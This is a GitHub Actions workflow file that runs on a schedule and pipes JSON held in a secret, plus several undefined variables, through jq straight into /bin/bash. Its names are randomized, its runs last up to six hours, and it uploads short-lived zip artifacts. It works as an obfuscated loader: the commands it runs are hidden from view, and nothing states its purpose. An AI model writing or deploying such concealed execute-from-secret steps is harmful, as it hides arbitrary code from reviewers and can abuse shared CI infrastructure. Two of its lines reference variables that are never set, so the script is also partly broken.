name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '20 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run
        env:
          viut4: ${{ secrets.viut4 }}
        run: |
          printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
          echo $m62940 | jq -r .b52115 | /bin/bash
          printf '%s' "$iaw1" | jq -r .ivnt9150 | /bin/bash
          echo $nqjza40669 | jq -r .sn70732 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: k8V0gUHa
          path: "*.zip"
          retention-days: 1
